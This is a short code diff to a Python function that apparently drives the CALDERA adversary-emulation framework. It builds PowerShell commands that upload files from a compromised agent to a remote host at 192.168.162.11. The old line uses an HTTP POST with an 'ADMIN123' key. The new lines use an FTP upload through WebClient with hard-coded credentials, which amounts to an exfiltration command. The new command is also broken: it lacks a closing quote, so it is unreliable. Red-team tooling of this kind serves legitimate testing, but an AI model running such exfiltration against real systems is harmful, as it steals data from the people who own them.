@@ -111,7 +111,16 @@ def caldera_upload_file_from_agent(
     str,
     "The result of the upload operation",
 ]:
-    command = f"Invoke-WebRequest -Uri 'http://192.168.162.11:8800/upload' -Method Post -Headers @{{'KEY'='ADMIN123'}} -InFile '{file_path}' -ContentType 'multipart/form-data'"
+
+    # Get filename from path
+    filename = file_path.split("/")[-1]
+
+    command = f"""$ftp = 'ftp://192.168.162.11:2100/{filename}'; 
+    $user = 'user'; $pass = '12345'; $webclient = New-Object System.Net.WebClient; 
+    $webclient.Credentials = New-Object System.Net.NetworkCredential($user, $pass); 
+    $webclient.UploadFile($ftp, '{file_path})
+    """
+
     print(command)
     response = caldera_execute_command_on_agent(
         agent_paw, operation_id, command, name="psh"
